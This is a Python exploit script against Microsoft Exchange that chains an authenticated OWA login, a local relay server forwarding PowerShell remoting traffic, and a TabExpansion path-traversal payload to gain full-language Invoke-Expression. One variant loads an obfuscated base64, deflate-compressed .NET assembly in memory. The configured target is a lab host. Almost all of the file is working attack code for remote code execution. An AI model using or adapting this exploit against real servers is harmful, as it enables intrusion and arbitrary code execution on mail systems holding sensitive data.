import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
import requests
s = requests.Session()

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    pass


class ExchangeExploitHandler(BaseHTTPRequestHandler):
    def do_POST(self):

        length = int(self.headers["content-length"])
        post_data = self.rfile.read(length).decode()

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.54 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/soap+xml;charset=UTF-8",
            "X-OWA-ExplicitLogonUser": f"owa/mastermailbox@outlook.com",
        }

        powershell_endpoint = f"https://{host}/owa/mastermailbox%40outlook.com/powershell"

        resp = s.post(
            powershell_endpoint,
            data=post_data,
            headers=headers,
            verify=False,
            allow_redirects=False,
        )
        content = resp.content
        self.send_response(200)
        self.end_headers()
        self.wfile.write(content)


def login(username, passwd):

    url = f"https://{host}/owa/auth.owa"

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.54 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    r = s.post(
        url,
        headers=headers,
        data={
            "destination": f"https://{host}/owa",
            "flags": "4",
            "forcedownlevel": "0",
            "username": username,
            "password": passwd,
            "passwordText": "",
            "isUtf8": "1",
        },
        verify=False,
    )
    if r.status_code != 200:
        print("[-] Fail when login")


def start_rpc_server():
    server = ThreadedHTTPServer(("127.0.0.1", 13337), ExchangeExploitHandler)
    server_thread = threading.Thread(target=server.serve_forever)
    server_thread.daemon = True
    server_thread.start()


def exploit(username):
    import sys
    import psrp
    import psrpcore.types
    sys.path.append("./")
    wsman_conn = psrp.WSManInfo(
        server="127.0.0.1",
        scheme="http",
        auth="basic",
        port="13337",
        ssl_context=None,
        encryption="never",
        username=username,

        password="random",
        configuration_name="Microsoft.Exchange",
    )

    app_args = {
        "PSVersionTable": {
            "WSManStackVersion": psrpcore.types.PSVersion("2.0")
        }
    }
    cmdlet = '''
        TabExpansion -line ";../../../../Windows/Microsoft.NET/assembly/GAC_MSIL/Microsoft.PowerShell.Commands.Utility/v4.0_3.0.0.0__31bf3856ad364e35/Microsoft.PowerShell.Commands.Utility.dll\Invoke-Expression" -lastWord "-test" ;invoke-expression "`$ExecutionContext.SessionState.LanguageMode='FullLanguage'";Invoke-Expression "`$Base64String = '7VbbaxxVGP/NZpNsLl3SqqGhpU6aFLYaxw3ZhzR42dzaRnIju02KVpO9nG7GzM4sZyZtUlEKoigo+iqC/4AIBQsWsc8+9U3QJ+mbL6KvImL8nTOzySZdaN/iQ77NOef7fuc7v/nO7TuZe/1ztACIs+zsAPcQShaPl9ssyWe/T+Jux4P+e8bsg/78uu2bNelVZKFqlgqu6wVmUZhy0zVt15xayJlVryysY8c6ByOOxWlg1mjBLxfmy3Xeh4j1dxldQBvCQnlLDTB3A+vReiyMG9hrdVCxUG1B9gPlqv722t0mHEfelWjCH8WaTHIN6H6CtXhEGF+iwUzQvtxgW4HYCtiW46GvnueB7xNes6QvS4hiyyKcaGK/H+GsJYXjlaJY1yKu7kf8Jg6GmY024rIe0oo7/GieB8J4kjk2kVPpGKagxx+PpUjUSUPSqnXKEdZdbe2puELly7RSrdrh195uyPdpJzwuQ2eqPUQ58jlDb1YCA8+jl33GRO61CSOKTk3vRsZKWyPpkeELCmmFw/ovloH3uLZ0+0npuUDabsVXHqNcl7sKu5LD77HwLAxcujKjYv6H9lVlTzheMZoPIePS0zF0KOPvcyPoDdemvl1Kb2/Q60XNIGzbcBanWC/gRdaerr/AZ6y/1vh91tgdFc6tR8fVqq1FU+EfnjyvGY/jPJLog7I6dN2Pr/AUtW+JDuNHnNH6WVjo4rcs9o0ihfjtgzv1KRpujf7yibr60pxX3nTEK9iwyo7D+1H1S5507CJy234gqlgovi1KAaxS4MkIs5Y23cCuCmvSq9ZsR8ickDfskvARAoXA9twl4RS2tOaPB9yU4mYgEA1Ubuwq2o4dbO/1btT5ZxZwkbxYkXYgxh0nry7QJJm8OjhruwLTWyVRU19ARQSrc8L3CxXBOQ1PYgzXOBcbLsrch5vwaechUEWN2q3oZyHAFgs6Avb5SptWXgozsY4CMRNFIoJMJnkkOQMEkR2QW9XrtE1cZ59DzQJeGNf9gv6SPpK6hxJ/mxoRjGqM2DtI4129DWPjP0+98cw381/+8OZp44+535D47ta15b7Mw49bTBhx0zASrYgZyWQchpEkltTm6bb2lmTyRF/CiBLFGXWM8rHeFVmozXvu7grl16V30zcwNLh3CubrebaJZAeboauTnpxynLmC7YbnRAh9apTsnCNXT7NRR/J/FENv1snwFd2Hq6yUboIrUW/H1Sww1PB+DcUyrJeRwyrraSxRm2EOnKc9w/oidSX343/+2+y1eTVqVYY6+CyH78syb6IkT3i/Zni3rvM+KRnUo/LsLRD12V/gfbTZ60YMd+KfGIojR1zqjFBpwrSufdK7vwxvfVrNjREZu/5TOkuUNE9t33dMvWaJBt9lffv9Bp80M8NeUdxt9FcxBNrXZewO16vALKXS2Ab9ykTU/UrpOGaJV7TXJFlr2NaRVJh/giiGjOZciHA74qzH5Dblzui4F3WmKjNDlch2MPqDsY/qMeP08HVWLZJpmxE8btyRHKKY4f9Ra5nDDuRIDkP+Aw==';`$CompressedBytes = [System.Convert]::FromBase64String(`$Base64String);`$InputStream = New-Object System.IO.MemoryStream @(,`$CompressedBytes);`$DeflateStream = New-Object System.IO.Compression.DeflateStream `$InputStream, ([System.IO.Compression.CompressionMode]::Decompress);`$OutputStream = New-Object System.IO.MemoryStream;`$DeflateStream.CopyTo(`$OutputStream);`$DeflateStream.Close();`$InputStream.Close();`$Payload = `$OutputStream.ToArray();`$Assembly = [System.Reflection.Assembly]::Load(`$Payload);`$classname = `$Assembly.GetTypes().Name;`$Assembly.CreateInstance(`$classname)";
        '''

    cmdlet = '''
    TabExpansion -line ";../../../../Windows/Microsoft.NET/assembly/GAC_MSIL/Microsoft.PowerShell.Commands.Utility/v4.0_3.0.0.0__31bf3856ad364e35/Microsoft.PowerShell.Commands.Utility.dll\Invoke-Expression" -lastWord "-test" ;invoke-expression "`$ExecutionContext.SessionState.LanguageMode='FullLanguage'";Microsoft.PowerShell.Commands.Utility\Invoke-Expression "[System.Security.Principal.WindowsIdentity]::GetCurrent().Name"
    '''
    with psrp.SyncRunspacePool(wsman_conn, application_arguments=app_args) as rp:
        ps = psrp.SyncPowerShell(rp)
        ps.add_script(cmdlet)
        output = ps.invoke()
     
        print(output[0])

        return


if __name__ == "__main__":


    host = "mail.t01.local"
    user = "root@t01.local"
    passwd = "Pentest@123"

    login(user, passwd)
    start_rpc_server()
    exploit(user)
